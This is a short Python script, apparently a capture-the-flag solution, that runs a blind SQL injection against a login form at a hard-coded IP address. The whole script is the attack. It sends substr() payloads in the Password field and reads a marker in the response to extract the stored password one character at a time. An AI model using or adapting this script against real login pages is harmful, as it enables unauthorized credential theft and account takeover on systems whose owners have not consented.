#!/usr/bin/env python3
import requests
import string
import sys

url = 'http://34.148.103.218:4446/fff5bf676ba8796f0c51033403b35311/login'

# Dump password
password = ''
while True:
    for c in string.printable:
        query = f"' or substr((select Password from users limit 1),{len(password)+1},1)='{c}"
        data = {"Username":"admin", "Password": query, "Submit":"Login"}
        print(query)
        try:
            r = requests.post(url, data=data)
            print(r.text)
            print('[-]Trying ' + password + c , end='\r')
        except:
            continue
        if 'ALSO I DIDNT' in r.text:
            print(f"[+]Found {password+c}")
            password += c
            break
        if c == string.printable[-1]:
            print(f"[+] password is \"{password}\"")
            quit()
